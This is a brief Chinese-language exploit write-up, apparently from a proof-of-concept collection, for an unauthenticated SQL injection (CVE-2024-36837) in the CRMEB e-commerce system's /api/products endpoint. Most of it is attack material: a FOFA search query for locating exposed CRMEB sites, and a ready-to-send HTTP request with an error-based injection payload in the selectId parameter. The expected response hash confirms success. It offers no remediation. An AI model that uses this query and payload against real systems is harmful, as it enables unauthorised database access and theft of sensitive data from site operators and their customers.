# CRMEB 电商系统 /api/products SQL注入漏洞(CVE-2024-36837)

### 1.漏洞描述

CRMEB开源商城系统是一款全开源可商用的系统，前后端分离开发，全部100%开源，在小程序、公众号、H5、APP、PC端皆可使用。

该系统/api/products接口处存在SQL注入漏洞，未授权攻击者可以利用漏洞获取敏感数据。

### 2.fofa语法

```xml
body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
```

### 3.漏洞复现

```xml
GET /api/products?limit=20&priceOrder&salesOrder&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(1436528)))),0x7e),3550) HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

响应包中含有“81a9eb3487199f3a2da3e3f6591ffd62”

![image](https://github.com/hardog123/poc-exp/assets/170905460/d3f3996e-f30c-43f7-8a8b-e04b2264f36e)
